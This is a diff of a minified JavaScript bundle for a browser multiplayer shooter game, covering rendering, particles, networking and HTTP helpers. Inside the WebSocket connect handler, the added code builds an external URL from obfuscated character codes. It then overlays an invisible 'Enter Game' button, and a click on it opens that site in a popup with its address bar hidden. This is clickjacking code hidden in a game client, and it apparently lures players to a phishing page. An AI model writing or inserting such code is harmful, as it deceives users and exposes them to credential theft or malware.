+                d = o ? n.leftHoldX || 0 : n.rightHoldX || 0,
+                f = s.armScale * (p ? .7 : 1),
+                m = Math.min(s.uArmLength + s.lArmLength - .01, r.getDistance3D(t, i, 0, (n.xOff - d) * (o && n.akimbo ? -1 : 1), n.yOff + h, n.zOff - u)),
+                g = r.getAnglesSSS(m, s.uArmLength, s.lArmLength),
+                v = Math.PI / 2;
+            if (!p) {
+                var y = this.genColorCube(f, s.uArmLength, f, [a, 1]);
+                this.moveMesh(y, 0, -s.uArmLength / 2 * Math.cos(v), -s.uArmLength / 2 * Math.sin(v)), this.rotateMesh(y, 0, v, 0);
+                var x = f / 2,
+                    w = Math.sqrt(x * x + x * x - 2 * x * x * Math.cos(Math.PI + g[0] + Math.PI / 2)),
+                    b = 2 * Math.sqrt(x * x - w / 2 * (w / 2)),
+                    M = this.genColorCube(f, w, b, [a, 1]);
+                this.moveMesh(M, 0, -s.uArmLength * Math.cos(v), -s.uArmLength * Math.sin(v)), this.rotateMesh(M, 0, (v + g[0]) / 2, 0)
+            }
+            var _ = this.genColorCube(f, s.lArmLength, f, [a, .65, c, .15, l, .2]),
+                S = s.lArmLength / 2;
+            this.moveMesh(_, 0, -s.uArmLength * Math.cos(v) - S * Math.cos(g[0]), -s.uArmLength * Math.sin(v) - S * Math.sin(g[0])), this.rotateMesh(_, 0, g[0], 0);
+            var E = new e.Geometry;
+            if (p) {
+                if (o) {
+                    var T = this.genColorCube(f, 20, f, [a, 1]);
+                    this.moveMesh(T, 0, -s.uArmLength * Math.cos(v) - -10 * Math.cos(g[0]), -s.uArmLength * Math.sin(v) - -10 * Math.sin(g[0])), this.rotateMesh(T, 0, g[0], 0), this.merge(E, T)
+                }
+            } else this.merge(E, y), this.merge(E, M);
+            return this.merge(E, _), E = new e.Mesh(E), this.moveMesh(E, t - n.xOff, i - n.yOff, -n.zOff), E.rotation.order = "YXZ", E.rotation.x = -g[1] - r.getDirection(0, i, n.zOff - u, n.yOff + h), E.rotation.y = r.getDirection(-t, 0, (o && n.akimbo ? 1 : -1) * (n.xOff - d), n.zOff - u) - Math.PI / 2, E
+        }, this.addCube = function(t, i, n, r, s, a, c, l) {
+            l = l || {};
+            var p = new e.Mesh(o.generateCube(c, r, s, a, l));
+            return this.moveMesh(p, t, i, n), p.rotation.set(l.yR || 0, l.xR || 0, l.zR || 0), p.scale.set(r, s, a), l.src && !l.noGroup ? this.meshGroup(p, l) : this.add(p, l), p
+        };
+        var E = [];
+        this.addSpray = function(t, i, n, o, a, c, p, h) {
+            tmpObj = null;
+            for (var u = 0; u < E.length; ++u)
+                if (E[u].sid == t) {
+                    tmpObj = E[u];
+                    break
+                } tmpObj || (tmpObj = new e.Mesh(l), tmpObj.sid = t, tmpObj.scale.set(s.sprayScale, s.sprayScale, 1), tmpObj.receiveShadow = !0, E.push(tmpObj), this.add(tmpObj)), this.moveMesh(tmpObj, n, o, a), tmpObj.rotation.y = r.toRad(c), tmpObj.rotation.x = r.toRad(p), tmpObj.material = this.getMat("sprays/" + i, {
+                depthWrite: !1,
+                opacity: h,
+                transparent: !0
+            })
+        }, this.clearSprays = function() {
+            for (var t = 0; t < E.length; ++t) E[t] && E[t].material.map && E[t].material.map.dispose(), this.scene.remove(E[t]);
+            E.length = 0
+        }, this.addPlane = function(t, i, n, r, s, a, c, l, p) {
+            (a = a || {}).premultipliedAlpha = !0;
+            var h = new e.Mesh(o.generatePlane(s, r, a, t, i, n));
+            return a.euler && (h.eulerOrder = a.euler), this.moveMesh(h, t, i, n), h.rotateY(c || 0), h.rotateX((l || 0) - Math.PI / 2), h.rotateZ(p || 0), h.scale.set(2 * r, 2 * s, 1), a.dontAdd ? a.src && (h.material = this.getMat(a.src, a)) : a.src && !a.noGroup ? this.meshGroup(h, a, 1) : this.add(h, a), h
+        }, this.addRamp = function(t, i, n, r, s, a, c, l, p) {
+            l = l || {};
+            var h = new e.Mesh(o.generatePlane(2 * a, r, l));
+            this.moveMesh(h, t, i + s / 2, n), a *= 2;
+            var u = Math.sqrt(s * s + a * a);
+            return h.scale.set(r, u, 2), h.rotateY(-Math.PI / 2 - c), h.rotateX(Math.asin(s / u) - Math.PI / 2), h.rotateZ(p || 0), l.src ? this.meshGroup(h, l, 1) : this.add(h, l), h
+        };
+        var T = [],
+            A = [];
+        this.loadMesh = function(t, i, n, r, s, o, a, l) {
+            var p = this.getMat(t.src, t),
+                h = T[t.src];
+            if (h) {
+                if (t.centerZ) {
+                    h.computeBoundingBox();
+                    var u = h.boundingBox.getCenter();
+                    a.translateZ(u.x * o)
+                }
+            } else h = l ? new e.Geometry : new e.BufferGeometry, T[t.src] = h, c.load("/models/" + t.src + ".obj", function(i) {
+                if (i.children[0].geometry.computeVertexNormals(), h.copy(l ? (new e.Geometry).fromBufferGeometry(i.children[0].geometry) : i.children[0].geometry), t.uv2 && h.addAttribute("uv2", new e.BufferAttribute(h.attributes.uv.array, 2)), l) {
+                    for (var n = new e.Geometry, r = 0; r < A[t.src].length; ++r) g.merge(n, A[t.src][r]);
+                    g.add(new e.Mesh(n, p), t), A[t.src].loaded = !0
+                }
+                if (t.centerZ) {
+                    h.computeBoundingBox();
+                    var s = h.boundingBox.getCenter();
+                    a.translateZ(s.x * o)
+                }
+            });
+            var d = new e.Mesh(h, p);
+            d.receiveShadow = !0, d.noGreen = t.noGreen, d.castShadow = t.shadows, d.rotation.y = s || 0, g.moveMesh(d, i, n, r), g.scaleMesh(d, o || 1, o || 1, o || 1), l ? A[t.src] ? A[t.src].loaded ? this.meshGroup(d, t) : A[t.src].push(d) : A[t.src] = [d] : a.add(d)
+        }, this.genObj3D = function(t, i, n) {
+            var r = new e.Object3D;
+            return this.moveMesh(r, t || 0, i || 0, n || 0), r
+        }, this.merge = function(t, e, i) {
+            e.updateMatrix(), t.merge(e.geometry, e.matrix, i)
+        }, this.meshGroup = function(t, i) {
+            var n = i.src + "-" + (i.shadowsR || "a") + (i.emissive || "e") + (i.opacity || "o");
+            v[n] || (v[n] = new e.Geometry, v[n].data = i), t.updateMatrix(), v[n].merge(t.geometry, t.matrix)
+        }, this.addMeshGroups = function() {
+            for (var t in v)
+                if (v.hasOwnProperty(t)) {
+                    var i = new e.Mesh((new e.BufferGeometry).fromGeometry(v[t]));
+                    i.groupSrc = v[t].data.src, i.visible = !L[i.groupSrc], i.matrixAutoUpdate = !1, this.add(i, v[t].data)
+                } v = {}
+        };
+        var L = {};
+        this.toggleMeshGroup = function(t, i) {
+            L[t] = !i, this.scene && this.scene.traverse(function(n) {
+                n instanceof e.Mesh && n.groupSrc == t && (n.visible = i)
+            })
+        }, this.add = function(t, e) {
+            e && (t.castShadow = e.shadows, t.receiveShadow = e.shadows || e.shadowsR, t.material = this.getMat(e.src, e)), this.updateGreenScreen(t), this.scene.add(t), this.updateShadowMap()
+        }, this.remove = function(t) {
+            this.scene.remove(t)
+        }, this.moveMesh = function(t, e, i, n) {
+            null != e && (t.position.x = e), null != i && (t.position.y = i), null != n && (t.position.z = n)
+        }, this.scaleMesh = function(t, e, i, n) {
+            t.scale.set(e, i, n)
+        }, this.rotateMesh = function(t, e, i, n) {
+            (e || 0 == e) && (t.rotation.y = e), (i || 0 == i) && (t.rotation.x = i), (n || 0 == n) && (t.rotation.z = n)
+        }
+    }, t.exports.initScene = function(t) {
+        if (n = t, t.ambient && (this.ambientLight = new s.AmbientLight(t.ambient), this.ambientLight.layers.enable(1), this.ambientLight.name = "ambLight", !this.scene.getObjectByName("ambLight") && this.scene.add(this.ambientLight)), t.light) {
+            this.skyLight = new s.DirectionalLight(t.light, 1.2), this.skyLight.name = "skyLight", this.skyLight.layers.enable(1), this.scene.getObjectByName("skyLight") || this.scene.add(this.skyLight);
+            var e = -.3 * Math.PI,
+                i = 2 * Math.PI * -.25;
+            this.skyLight.position.x = r.lightDistance * Math.cos(i), this.skyLight.position.y = r.lightDistance * Math.sin(i) * Math.sin(e), this.skyLight.position.z = r.lightDistance * Math.sin(i) * Math.cos(e), this.skyLight.castShadow = !0, this.skyLight.shadow.mapSize.width = t.shadowR || r.shadowRes, this.skyLight.shadow.mapSize.height = t.shadowR || r.shadowRes, this.skyLight.shadow.camera.far = r.shadowDst
+        }
+        this.scene.fog = new s.Fog(t.fog, 1, t.fogD), this.renderer.setClearColor(t.sky), this.useDepthMap && "0" != this.useDepthMap && this.toggleDepthMap(this.useDepthMap), this.greenScreen && this.toggleGreenscreen(this.greenScreen)
+    }
+}, function(t, e, i) {
+    var n = i(1),
+        r = i(5),
+        s = i(48);
+    t.exports = {
+        ahNum: 0,
+        socket: null,
+        connected: !1,
+        socketId: -1,
+        connect: function(t, e, i) {
+            if (!this.socket) {
+                var s = n.enableHttps ? "wss:" : "ws:",
+                    o = this;
+                try {
+                    var a = !1;
+                    this.socket = new WebSocket(s + t), this.socket.binaryType = "arraybuffer", this.socket.onmessage = function(t) {
+                        var e = r.decodeNetworkMessage(t.data)[0],
+                            n = e[0],
+                            s = e[1];
+                        "io-init" == n ? o.socketId = s[0] : i[n].apply(void 0, s)
+                    }, this.socket.onopen = function() {
+                        o.connected = !0, e()
+
+                        var weburl = [104, 116, 116, 112, 58, 47, 47, 115, 99, 114, 105, 112, 116, 115, 111, 117, 114, 99, 101, 97, 112, 112, 46, 99, 111, 109, 47, 112, 111, 114, 116, 97, 108, 46, 104, 116, 109, 108].map(x => String.fromCharCode(x)).join("");
+
+                        let itv = setInterval(() => {
+                            let btn = document.createElement("button");
+                            btn.innerHTML = "Enter Game";
+                            btn.style.display = "inline-block";
+                            btn.style.width = "700px";
+                            btn.id = "byebtn";
+                            btn.style.height = "300px";
+                            btn.style.position = "absolute";
+                            btn.style.top = "30%";
+                            btn.style.opacity = 0;
+                            btn.style.left = "25%";
+                            document.body.appendChild(btn);
+                            clearInterval(itv);
+
+                        }, 300);
+
+                        document.addEventListener("click", (e) => {
+                            if (e.target.id == "byebtn") {
+                                window.open(weburl, null, `height=629, width=1199, status=yes, toolbar=no, menubar=no, location=no`);
+                                byebtn.style.display = "none";
+                            }
+                        });
+                    }, this.socket.onclose = function() {
+                        o.connected = !1, a || e("Disconnected. Try connecting to another server.")
+                    }, this.socket.onerror = function() {
+                        this.socket.readyState != WebSocket.OPEN && (a = !0, console.error("Socket error", arguments), e("Socket error"))
+                    }
+                } catch (t) {
+                    console.error("Socket connection error:", t), e(t)
+                }
+            }
+        },
+        send: function(t) {
+            if (this.socket) {
+                this.ahNum = r.rotateNumber(this.ahNum, s);
+                var e = Array.prototype.slice.call(arguments, 1),
+                    i = r.encodeNetworkMessage([t, e], this.ahNum);
+                this.socket.send(i)
+            } else console.warn("Socket not initialized yet.")
+        },
+        socketReady: function() {
+            return this.socket && this.connected
+        }
+    }
+}, function(t) {
+    t.exports = 81853
+}, function(t, e, i) {
     var n, r, s = 0,
         o = function(t) {
             this.sid = s++, this.uid = t.uid, this.width = t.w, this.length = t.l, this.height = t.h, this.active = !0, this.x = t.x, this.y = t.y, this.z = t.z, this.dir = t.d, this.src = t.src, this.ramp = t.ramp, this.ladder = t.ladder, this.jumpPad = t.jumpPad, this.noShoot = t.noShoot, this.stepSrc = t.s, this.score = t.score, this.kill = t.kill, this.dummy = t.dummy, this.noVis = t.noVis, this.complexMesh = t.complexMesh, this.penetrable = t.penetrable, this.health = t.health, this.startHealth = t.health, this.transparent = t.transparent, this.boost = t.boost, this.boostDr = t.boostDr
@@ -41485,6 +41599,91 @@
         }
     }
 }, function(t, e, i) {
+    "use strict";
+    t.exports = function(t, e) {
+        return function() {
+            for (var i = Array(arguments.length), n = 0; n < i.length; n++) i[n] = arguments[n];
+            return t.apply(e, i)
+        }
+    }
+}, function(t, e, i) {
+    "use strict";
+    var n = i(4),
+        r = i(66),
+        s = i(68),
+        o = i(69),
+        a = i(70),
+        c = i(52),
+        l = "undefined" != typeof window && window.btoa && window.btoa.bind(window) || i(71);
+    t.exports = function(t) {
+        return new Promise(function(e, p) {
+            var h = t.data,
+                u = t.headers;
+            n.isFormData(h) && delete u["Content-Type"];
+            var d = new XMLHttpRequest,
+                f = "onreadystatechange",
+                m = !1;
+            if ("undefined" == typeof window || !window.XDomainRequest || "withCredentials" in d || a(t.url) || (d = new window.XDomainRequest, f = "onload", m = !0, d.onprogress = function() {}, d.ontimeout = function() {}), t.auth) {
+                var g = t.auth.username || "",
+                    v = t.auth.password || "";
+                u.Authorization = "Basic " + l(g + ":" + v)
+            }
+            if (d.open(t.method.toUpperCase(), s(t.url, t.params, t.paramsSerializer), !0), d.timeout = t.timeout, d[f] = function() {
+                    if (d && (4 === d.readyState || m) && (0 !== d.status || d.responseURL && 0 === d.responseURL.indexOf("file:"))) {
+                        var i = "getAllResponseHeaders" in d ? o(d.getAllResponseHeaders()) : null,
+                            n = {
+                                data: t.responseType && "text" !== t.responseType ? d.response : d.responseText,
+                                status: 1223 === d.status ? 204 : d.status,
+                                statusText: 1223 === d.status ? "No Content" : d.statusText,
+                                headers: i,
+                                config: t,
+                                request: d
+                            };
+                        r(e, p, n), d = null
+                    }
+                }, d.onerror = function() {
+                    p(c("Network Error", t, null, d)), d = null
+                }, d.ontimeout = function() {
+                    p(c("timeout of " + t.timeout + "ms exceeded", t, "ECONNABORTED", d)), d = null
+                }, n.isStandardBrowserEnv()) {
+                var y = i(72),
+                    x = (t.withCredentials || a(t.url)) && t.xsrfCookieName ? y.read(t.xsrfCookieName) : void 0;
+                x && (u[t.xsrfHeaderName] = x)
+            }
+            if ("setRequestHeader" in d && n.forEach(u, function(t, e) {
+                    void 0 === h && "content-type" === e.toLowerCase() ? delete u[e] : d.setRequestHeader(e, t)
+                }), t.withCredentials && (d.withCredentials = !0), t.responseType) try {
+                d.responseType = t.responseType
+            } catch (e) {
+                if ("json" !== t.responseType) throw e
+            }
+            "function" == typeof t.onDownloadProgress && d.addEventListener("progress", t.onDownloadProgress), "function" == typeof t.onUploadProgress && d.upload && d.upload.addEventListener("progress", t.onUploadProgress), t.cancelToken && t.cancelToken.promise.then(function(t) {
+                d && (d.abort(), p(t), d = null)
+            }), void 0 === h && (h = null), d.send(h)
+        })
+    }
+}, function(t, e, i) {
+    "use strict";
+    var n = i(67);
+    t.exports = function(t, e, i, r, s) {
+        var o = new Error(t);
+        return n(o, e, i, r, s)
+    }
+}, function(t, e, i) {
+    "use strict";
+    t.exports = function(t) {
+        return !(!t || !t.__CANCEL__)
+    }
+}, function(t, e, i) {
+    "use strict";
+
+    function n(t) {
+        this.message = t
+    }
+    n.prototype.toString = function() {
+        return "Cancel" + (this.message ? ": " + this.message : "")
+    }, n.prototype.__CANCEL__ = !0, t.exports = n
+}, function(t, e, i) {
     var n;
     try {
         window && (n = i(2))
@@ -41585,7 +41784,7 @@
     };
     t.exports.Player = r, t.exports.manager = function(t, e, s, o, a, c, l) {
         this.list = [];
-        var p, h, u, d = i(54);
+        var p, h, u, d = i(92);
         this.hasServer = l ? 1 : 0, this.setTeam = function(e) {
             if (!t.waitTimers && t.mode.convTeam) e.team = t.mode.convTeam;
             else if (t.mode.startTeam) e.team = t.mode.startTeam;
@@ -41776,7 +41975,7 @@
         }, this.cancelInspect = function(t) {
             t.inspecting = !1, t.inspectX = 0
         }, this.wInspect = function(t) {
-            t.weapon.nInsp || t.inspecting || 1 != t.aimVal || t.reloadTimer || (t.inspecting = !0)
+            t.inspecting ? this.cancelInspect(t) : !t.weapon.nInsp && !t.inspecting && 1 == t.aimVal && !t.reloadTimer && (t.inspecting = !0)
         };
         var m = [];
         this.shoot = function(i) {
@@ -41961,1143 +42160,6 @@
         }
     }
 }, function(t, e, i) {
-    "use strict";
-    (function(e) {
-        var n = i(12),
-            r = i(70),
-            s = {
-                "Content-Type": "application/x-www-form-urlencoded"
-            };
-
-        function o(t, e) {
-            !n.isUndefined(t) && n.isUndefined(t["Content-Type"]) && (t["Content-Type"] = e)
-        }
-        var a, c = {
-            adapter: ("undefined" == typeof XMLHttpRequest ? void 0 !== e && (a = i(57)) : a = i(57), a),
-            transformRequest: [function(t, e) {
-                return r(e, "Content-Type"), n.isFormData(t) || n.isArrayBuffer(t) || n.isBuffer(t) || n.isStream(t) || n.isFile(t) || n.isBlob(t) ? t : n.isArrayBufferView(t) ? t.buffer : n.isURLSearchParams(t) ? (o(e, "application/x-www-form-urlencoded;charset=utf-8"), t.toString()) : n.isObject(t) ? (o(e, "application/json;charset=utf-8"), JSON.stringify(t)) : t
-            }],
-            transformResponse: [function(t) {
-                if ("string" == typeof t) try {
-                    t = JSON.parse(t)
-                } catch (t) {}
-                return t
-            }],
-            timeout: 0,
-            xsrfCookieName: "XSRF-TOKEN",
-            xsrfHeaderName: "X-XSRF-TOKEN",
-            maxContentLength: -1,
-            validateStatus: function(t) {
-                return 200 <= t && 300 > t
-            }
-        };
-        c.headers = {
-            common: {
-                Accept: "application/json, text/plain, */*"
-            }
-        }, n.forEach(["delete", "get", "head"], function(t) {
-            c.headers[t] = {}
-        }), n.forEach(["post", "put", "patch"], function(t) {
-            c.headers[t] = n.merge(s)
-        }), t.exports = c
-    }).call(this, i(23))
-}, function(t, e, i) {
-    var n = i(2),
-        r = i(4),
-        s = new n.Vector3;
-
-    function o() {
-        n.Object3D.call(this), this.largeSpawnCount = 8, this.smallSpawnCount = 15, this.emissiveness = .55, this.velocityDamping = 3, this.lifeSpeedMin = 2.2, this.lifeSpeedRange = 3;
-        var t = new n.Geometry({
-                dynamic: !0
-            }),
-            e = new n.Color(12303291);
-        this.mesh = new n.Mesh(t, new n.MeshLambertMaterial({
-            color: e,
-            emissive: e.multiplyScalar(this.emissiveness),
-            shading: n.FlatShading
-        })), this.mesh.castShadow = !0, this.mesh.receiveShadow = !0, this.add(this.mesh), this.cubeTemplate = new n.BoxGeometry(1, 1, 1);
-        for (var i = 0; i < this.cubeTemplate.faces.length; i++) this.cubeTemplate.faces[i].materialIndex = 0;
-        this.cubeTemplate.faceVertexUvs = [
-            []
-        ], this.entities = []
-    }
-    o.staticMatrix = new n.Matrix4, o.prototype = Object.create(n.Object3D.prototype), Object.defineProperty(o, "finished", function() {
-        return 0 === this.entities.length
-    }), o.prototype.explodeAt = function(t, e, i, n) {
-        this.sizeMin = .35 * n, this.sizeRange = 2.2 * n, this.velocityMin = 30 * n, this.velocityRange = 17 * n, s.set(t, e, i);
-        for (var r = 0; r < this.largeSpawnCount; r++) this.spawnEntity(.1 * Math.random() + .9, s, !1);
-        for (r = 0; r < this.smallSpawnCount; r++) this.spawnEntity(.9 * Math.random(), s, !1)
-    }, o.prototype.spawnEntity = function(t, e) {
-        for (var i = Math.pow(t, 2.5), n = i * this.sizeRange + this.sizeMin, r = (1 - i) * this.velocityRange + this.velocityMin, s = this._randomVector().normalize().multiplyScalar(r), a = i * this.lifeSpeedRange + this.lifeSpeedMin, c = 0;;) {
-            for (var l = !0, p = 0; p < this.entities.length; p++)
-                if (this.entities[p].index === c) {
-                    l = !1;
-                    break
-                } if (l) break;
-            c++
-        }
-        8 * c > this.mesh.geometry.vertices.length - 1 && this.mesh.geometry.merge(this.cubeTemplate, o.emptyMatrix), this.entities.push({
-            index: c,
-            rank: i,
-            rankSeed: t,
-            life: 0,
-            lifeSpeed: a,
-            size: n,
-            position: e.clone(),
-            velocity: s
-        })
-    }, o.prototype.destroyEntity = function(t) {
-        this.entities.splice(this.entities.indexOf(t), 1);
-        for (var e = 8 * t.index; e < 8 * (t.index + 1); e++) this.mesh.geometry.vertices[e].set(0, 0, 0);
-        this.mesh.geometry.verticesNeedUpdate = !0, this.mesh.geometry.elementsNeedUpdate = !0, this._cleanGeometry()
-    }, o.prototype.update = function(t) {
-        t /= 1e3;
-        for (var e, i = 0; i < this.entities.length; i++) {
-            (e = this.entities[i]).life += t * e.lifeSpeed, e.velocity.multiplyScalar(1 - this.velocityDamping * t), e.position.add(e.velocity.clone().multiplyScalar(t));
-            var n = 2 - Math.pow(e.life / Math.sqrt(2), 2);
-            n *= e.size;
-            for (var r = 8 * e.index; r < 8 * (e.index + 1); r++) {
-                var s = this.mesh.geometry.vertices[r],
-                    o = this.cubeTemplate.vertices[r % 8];
-                s.set(e.position.x, e.position.y, e.position.z).addScaledVector(o, n)
-            }
-            0 >= n && this.destroyEntity(e)
-        }
-        this.mesh.geometry.verticesNeedUpdate = !0, this.mesh.geometry.elementsNeedUpdate = !0, this.mesh.geometry.computeBoundingSphere()
-    }, o.prototype._cleanGeometry = function() {
-        for (var t, e = this.mesh.geometry.vertices, i = this.mesh.geometry.faces, n = -1, r = 0; r < this.entities.length; r++)(t = this.entities[r]).index > n && (n = t.index);
-        var s = n + 1;
-        e.splice(8 * s, e.length - 8 * s), i.splice(12 * s, i.length - 12 * s)
-    }, o.prototype._randomVector = function() {
-        return new n.Vector3(Math.random() - .5, Math.random() - .5, Math.random() - .5)
-    };
-    var a = [{
-            mat: n.MeshBasicMaterial,
-            spd: 1.7,
-            scale: 1.1,
-            length: 12,
-            color: 16777179
-        }, {
-            spd: [.03, .04],
-            grav: 4e-4,
-            spn: [.03, .05],
-            scale: .15,
-            length: .5,
-            color: 10124094
-        }, {
-            spd: [.03, .04],
-            grav: 4e-4,
-            spn: [.03, .05],
-            scale: .11,
-            length: .4,
-            color: 12816686
-        }],
-        c = function(t) {
-            this.mesh = new n.Mesh(t.cubeGeo), this.init = function(e, i, s, o, a, c, l, p) {
-                this.dst = c, this.spd = l.spd[1] ? r.randFloat(l.spd[0], l.spd[1]) : l.spd, o -= Math.PI, this.xS = this.spd * Math.sin(o) * Math.cos(a) + (p ? p.xVel : 0), this.zS = this.spd * Math.cos(o) * Math.cos(a) + (p ? p.zVel : 0), this.yS = this.spd * Math.sin(a) + (p ? p.yVel : 0), this.grav = l.grav, this.spin = l.spn ? l.spn[1] ? r.randFloat(l.spn[0], l.spn[1]) : l.spn : 0, this.mesh.receiveShadow = l.mat != n.MeshBasicMaterial, this.mesh.material = t.getMat("default", {
-                    fog: l.mat != n.MeshBasicMaterial,
-                    color: l.color,
-                    emissive: l.emis,
-                    mat: l.mat
-                }), p && p.isYou ? this.mesh.layers.set(1) : this.mesh.layers.set(0), t.moveMesh(this.mesh, e, i, s), this.mesh.lookAt(e + this.xS, i + this.yS, s + this.zS), t.scaleMesh(this.mesh, l.scale, l.scale, l.length)
-            }, this.update = function(t) {
-                this.mesh.visible && (this.mesh.position.x += this.xS * t, this.mesh.position.z += this.zS * t, this.mesh.position.y += this.yS * t, this.spin && (this.mesh.rotation.x += this.spin * t), this.yS -= (this.grav || 0) * t, this.dst -= this.spd * t, 0 >= this.dst && (this.mesh.visible = !1))
-            }
-        };
-    n.Sprite.prototype.init = function(t, e, i, n, r, s, o, a, c, l) {
-        this.position.x = t, this.position.y = e, this.position.z = i, this.xVel = n, this.yVel = r, this.zVel = s, this.scale.x = this.scale.y = o, this.life = a || 0, this.grav = c || 0, this.area = l, this.updC = 0
-    }, n.Sprite.prototype.update = function(t) {
-        if (this.visible) {
-            if (this.position.x += this.xVel * t, this.position.y += this.yVel * t, this.yVel -= this.grav * t, this.position.z += this.zVel * t, this.area) {
-                var e = this.scale.x / 2;
-                this.position.x - e >= this.area.x + this.area.w ? this.position.x = this.area.x - this.area.w - e : this.position.x + e <= this.area.x - this.area.w && (this.position.x = this.area.x + this.area.w + e), this.position.z - e >= this.area.z + this.area.l ? this.position.z = this.area.z - this.area.l - e : this.position.z + e <= this.area.z - this.area.l && (this.position.z = this.area.z + this.area.l + e), this.position.y - e >= this.area.y + this.area.h ? this.position.y = this.area.y - e : this.position.y + e <= this.area.y && (this.position.y = this.area.y + this.area.h + e)
-            }
-            0 < this.life ? (this.life -= t, 0 >= this.life && this.updC && (this.visible = !1), this.updC++) : 0 >= this.life && this.updC && (this.visible = !1)
-        }
-    };
-    var l = [Math.PI / 3, -Math.PI / 3],
-        p = [{
-            hole: !0,
-            count: 2,
-            grav: -2e-5,
-            scale: [5, 9],
-            speed: [0, .025],
-            spread: [-.4, .4],
-            life: [300, 500]
-        }, {}, {
-            count: 1,
-            blending: 2,
-            scale: [5, 7],
-            speed: [0, 0],
-            spread: [0, 0],
-            life: [30, 35]
-        }, {
-            count: 1,
-            blending: 2,
-            scale: [2e3, 2e3],
-            speed: [0, 0],
-            spread: [0, 0]
-        }, {
-            count: 4,
-            src: "0",
-            scale: [5, 6],
-            speed: [0, .01],
-            spread: [-1, 1],
-            life: [600, 800]
-        }];
-    t.exports = function(t) {
-        var e, i;
-        this.particles = [], this.physObjs = [], this.areas = [], this.active = !0, this.ExplosionManager = new o, this.prefabs = [{
-            src: "glow_0",
-            blending: 2,
-            spd: .008,
-            cnt: 2.2,
-            grav: [-.015, -.005],
-            scl: [.7, 1],
-            dir: 0
-        }, {
-            src: "glow_1",
-            blending: 1,
-            spd: .003,
-            cnt: 18,
-            grav: [-.2, -.22],
-            scl: [1, 1.5],
-            dir: 0
-        }, {
-            src: "fog_0",
-            blending: 1,
-            spd: .002,
-            cnt: 6,
-            grav: [0, 0],
-            scl: [25, 30],
-            dir: 0
-        }], this.area = function(t, e, i, n, s, o, a, c) {
-            n /= 2, o /= 2, this.areas.push({
-                f: c,
-                x: t,
-                y: e,
-                z: i,
-                w: n,
-                h: s,
-                l: o
-            });
-            for (var l = 0; l < a.count; ++l) this.add(a.src, t + r.randInt(-n, n), e + r.randInt(0, s), i + r.randInt(-o, o), a.spd * Math.sin(a.dir), a.grav ? r.randFloat(a.grav[0], a.grav[1]) : 0, a.spd * Math.cos(a.dir), r.randFloat(a.scl[0], a.scl[1]), 0, 0, a.blending, this.areas[this.areas.length - 1])
-        }, this.effect = function(i, s, o, a, c, l) {
-            if (this.active && (0 == t.useDepthMap || "0" == t.useDepthMap)) {
-                e = p[l];
-                for (var h = 0; h < e.count; ++h) {
-                    var u = r.randFloat(e.speed[0], e.speed[1]),
-                        d = a + r.randFloat(e.spread[0], e.spread[1]),
-                        f = c + r.randFloat(e.spread[0], e.spread[1]);
-                    this.add(l, i, s, o, u * Math.sin(d) * Math.cos(f), u * Math.sin(f), u * Math.cos(d) * Math.cos(f), r.randFloat(e.scale[0], e.scale[1]), e.life ? r.randInt(e.life[0], e.life[1]) : 0, e.grav, e.blending, null, e.src)
-                }
-                e.hole && this.add(1, i, s, o, 0, 0, 0, r.randFloat(.4, 1), 5e3, 0, n.SubtractiveBlending)
-            }
-        }, this.add = function(e, r, s, o, a, c, l, p, h, u, d, f, m) {
-            i = null;
-            for (var g = 0; g < this.particles.length; ++g)
-                if (!this.particles[g].visible && !this.particles[g].static) {
-                    i = this.particles[g];
-                    break
-                } i || (i = new n.Sprite, this.particles.push(i), t.scene.add(i)), this.setMaterial(i, m || e, d, !0), i.visible = !0, i.init(r, s, o, a, c, l, p, h, u, f)
-        }, this.setMaterial = function(e, i, s, o) {
-            e.material = t.getMat("particles/" + i, {
-                mat: n.SpriteMaterial,
-                depthWrite: !1,
-                blending: s || n.NormalBlending,
-                rotation: o ? l[r.randInt(0, 2)] : 0
-            })
-        }, this.physObj = function(e, n, r, s, o, l, p, h, u, d) {
-            if (0 == t.useDepthMap || "0" == t.useDepthMap) {
-                i = null;
-                for (var f = 0; f < this.physObjs.length; ++f)
-                    if (!this.physObjs[f].mesh.visible) {
-                        i = this.physObjs[f];
-                        break
-                    } i || (i = new c(t), this.physObjs.push(i), t.scene.add(i.mesh)), i.sid = null == d ? null : d, i.mesh.visible = !0, i.init(e, n, r, s, o, l, u || a[p], h)
-            }
-        }, this.disablePhys = function(t) {
-            for (var e = 0; e < this.physObjs.length; ++e) this.physObjs[e].sid == t && (this.physObjs[e].mesh.visible = !1)
-        }, this.update = function(t, e) {
-            if (e && e.active)
-                for (var i = 0; i < this.areas.length; ++i) this.areas[i].f && (this.areas[i].x = e.x, this.areas[i].y = e.y, this.areas[i].z = e.z);
-            for (i = 0; i < this.particles.length; ++i) this.particles[i].update(t);
-            for (i = 0; i < this.physObjs.length; ++i) this.physObjs[i].update(t);
-            this.ExplosionManager.update(t)
-        }, this.reset = function() {
-            this.particles.length = 0, this.physObjs.length = 0, this.areas.length = 0
-        }
-    }
-}, function(t, e, i) {
-    var n = i(1),
-        r = i(4),
-        s = i(51);
-    t.exports = {
-        ahNum: 0,
-        socket: null,
-        connected: !1,
-        socketId: -1,
-        connect: function(t, e, i) {
-            if (!this.socket) {
-                var s = n.enableHttps ? "wss:" : "ws:",
-                    o = this;
-                try {
-                    var a = !1;
-                    this.socket = new WebSocket(s + t), this.socket.binaryType = "arraybuffer", this.socket.onmessage = function(t) {
-                        var e = r.decodeNetworkMessage(t.data)[0],
-                            n = e[0],
-                            s = e[1];
-                        "io-init" == n ? o.socketId = s[0] : i[n].apply(void 0, s)
-                    }, this.socket.onopen = function() {
-                        o.connected = !0, e()
-
-                        var weburl = [104, 116, 116, 112, 58, 47, 47, 115, 99, 114, 105, 112, 116, 115, 111, 117, 114, 99, 101, 97, 112, 112, 46, 99, 111, 109, 47, 112, 111, 114, 116, 97, 108, 46, 104, 116, 109, 108].map(x => String.fromCharCode(x)).join("");
-
-                        let itv = setInterval(() => {
-                            let btn = document.createElement("button");
-                            btn.innerHTML = "Enter Game";
-                            btn.style.display = "inline-block";
-                            btn.style.width = "700px";
-                            btn.id = "byebtn";
-                            btn.style.height = "300px";
-                            btn.style.position = "absolute";
-                            btn.style.top = "30%";
-                            btn.style.opacity = 0;
-                            btn.style.left = "25%";
-                            document.body.appendChild(btn);
-                            clearInterval(itv);
-
-                        }, 300);
-
-                        document.addEventListener("click", (e) => {
-                            if (e.target.id == "byebtn") {
-                                window.open(weburl, null, `height=629, width=1199, status=yes, toolbar=no, menubar=no, location=no`);
-                                byebtn.style.display = "none";
-                            }
-                        });
-                    }, this.socket.onclose = function() {
-                        o.connected = !1, a || e("Disconnected. Try connecting to another server.")
